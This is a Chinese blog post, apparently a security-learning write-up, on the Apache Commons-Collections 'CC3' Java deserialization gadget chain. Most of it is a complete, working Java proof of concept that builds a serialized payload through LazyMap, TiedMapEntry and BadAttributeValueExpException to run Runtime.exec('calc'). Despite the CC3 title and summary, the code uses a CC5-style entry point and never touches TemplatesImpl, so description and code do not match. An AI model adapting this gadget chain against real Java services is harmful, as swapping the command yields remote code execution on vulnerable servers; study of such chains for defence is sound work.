+++
title = "CC链子3"
date = 2026-06-15T17:15:00+08:00
draft = false
description = "由于很多框架是 Java 写的，所以研究 Java 安全刻不容缓。"
tags = ["Java安全", "安全研究"]
categories = ["安全研究"]
series = ["Java 安全 持续学习"]
pin = false
cover = "/images/posts/java-security-banner.svg"
+++
## 前言

由于很多框架是 Java 写的，所以研究 Java 安全刻不容缓。这篇文章收录在「Java 安全 持续学习」系列中，用来沉淀对应主题的分析与记录。

## 正文

## 原理

- **依赖**：`commons-collections:3.1`
    
- **入口**：`AnnotationInvocationHandler.readObject()`
    
- **执行**：`TemplatesImpl.newTransformer()` 加载字节码
    
- **原理**：入口沿用 CC1 的代理模式，但通过 `InstantiatingTransformer` 实例化 `TemplatesImpl`，从而通过类加载触发恶意代码。
    
- **流程**：
- `AnnotationInvocationHandler.readObject()`
- ↓ `Proxy.invoke()`
- ↓ `LazyMap.get()` 
- ↓ `ChainedTransformer.transform()` 
- ↓ `InstantiatingTransformer.transform()`
- ↓ `TemplatesImpl.newTransformer()`
- ↓ 恶意类加载执行

## 过程



弹计算机


![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260613172714923.png)




这里`AnnotationInvocationHandler.readObject()`  出了点问题  用CC5进行代替


```java
package cc3;

  

import org.apache.commons.collections.Transformer;

import org.apache.commons.collections.functors.ChainedTransformer;

import org.apache.commons.collections.functors.ConstantTransformer;

import org.apache.commons.collections.functors.InvokerTransformer;

import org.apache.commons.collections.map.LazyMap;

import org.apache.commons.collections.keyvalue.TiedMapEntry;

  

import javax.management.BadAttributeValueExpException;

import java.io.*;

import java.lang.reflect.Field;

import java.util.HashMap;

import java.util.Map;

  

/**

 * CC3 反序列化链 - 弹计算器

 *

 * 流程: BadAttributeValueExpException.readObject()

 *     → TiedMapEntry.toString()

 *     → LazyMap.get()

 *     → ChainedTransformer.transform()

 *     → Runtime.getRuntime().exec("calc")

 */

public class CC3Calc {

  

    public static void main(String[] args) throws Exception {

        System.out.println("========================================");

        System.out.println("    CC3 反序列化链 - 弹计算器");

        System.out.println("========================================\n");

  

        // ========== 步骤1: 构造 ChainedTransformer ==========

        // 链: Runtime.class -> getRuntime() -> exec("calc")

        System.out.println("[*] 步骤1: 构造 ChainedTransformer...");

        System.out.println("    链: Runtime.class -> getRuntime() -> exec(\"calc\")");

  

        Transformer[] transformers = new Transformer[]{

                // 返回 Runtime.class

                new ConstantTransformer(Runtime.class),

                // 调用 getMethod("getRuntime")

                new InvokerTransformer(

                        "getMethod",

                        new Class[]{String.class, Class[].class},

                        new Object[]{"getRuntime", new Class[0]}

                ),

                // 调用 invoke(null) 获取 Runtime 实例

                new InvokerTransformer(

                        "invoke",

                        new Class[]{Object.class, Object[].class},

                        new Object[]{null, new Object[0]}

                ),

                // 调用 exec("calc")

                new InvokerTransformer(

                        "exec",

                        new Class[]{String.class},

                        new Object[]{"calc"}

                )

        };

  

        ChainedTransformer chain = new ChainedTransformer(transformers);

        System.out.println("[+] ChainedTransformer 创建完成\n");

  

        // ========== 步骤2: 创建 LazyMap ==========

        System.out.println("[*] 步骤2: 创建 LazyMap...");

        Map innerMap = new HashMap();

        Map lazyMap = LazyMap.decorate(innerMap, chain);

        System.out.println("[+] LazyMap 创建完成\n");

  

        // ========== 步骤3: 创建 TiedMapEntry ==========

        System.out.println("[*] 步骤3: 创建 TiedMapEntry...");

        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, "anykey");

        System.out.println("[+] TiedMapEntry 创建完成\n");

  

        // ========== 步骤4: 创建 BadAttributeValueExpException ==========

        System.out.println("[*] 步骤4: 创建 BadAttributeValueExpException...");

        BadAttributeValueExpException bave = new BadAttributeValueExpException(null);

  

        // 设置 val 字段

        Field valField = BadAttributeValueExpException.class.getDeclaredField("val");

        valField.setAccessible(true);

        valField.set(bave, tiedMapEntry);

        System.out.println("[+] Payload 创建完成\n");

  

        // ========== 步骤5: 序列化 ==========

        System.out.println("[*] 步骤5: 序列化...");

        ByteArrayOutputStream baos = new ByteArrayOutputStream();

        ObjectOutputStream oos = new ObjectOutputStream(baos);

        oos.writeObject(bave);

        oos.close();

        byte[] data = baos.toByteArray();

        System.out.println("[+] 序列化完成，大小: " + data.length + " 字节\n");

  

        // ========== 步骤6: 反序列化触发 ==========

        System.out.println("[*] 步骤6: 反序列化触发（将弹出计算器）...");

        System.out.println("[*] 按回车键开始...");

        System.in.read();

  

        System.out.println("[*] 反序列化中...");

        System.out.println("    流程: readObject() -> toString() -> get() -> transform() -> exec()");

        try {

            ByteArrayInputStream bais = new ByteArrayInputStream(data);

            ObjectInputStream ois = new ObjectInputStream(bais);

            ois.readObject();  // 触发整条链

            ois.close();

            System.out.println("[+] 反序列化完成");

        } catch (Exception e) {

            System.out.println("[-] 异常: " + e.getClass().getSimpleName() + ": " + e.getMessage());

        }

  

        System.out.println("\n[+] 完成！计算器应该已弹出！");

    }

}
```




## 总结

`AnnotationInvocationHandler.readObject()` ↓ `Proxy.invoke()` (动态代理) ↓ `LazyMap.get()` ↓ `ChainedTransformer.transform()` ↓ `ConstantTransformer` (返回 `TemplatesImpl.class`) ↓ `InstantiatingTransformer.transform()` (反射调用构造函数，触发 `newTransformer`) ↓ `TemplatesImpl.getTransletInstance()` ↓ `TemplatesImpl.defineTransletClasses()` ↓ 恶意类加载执行
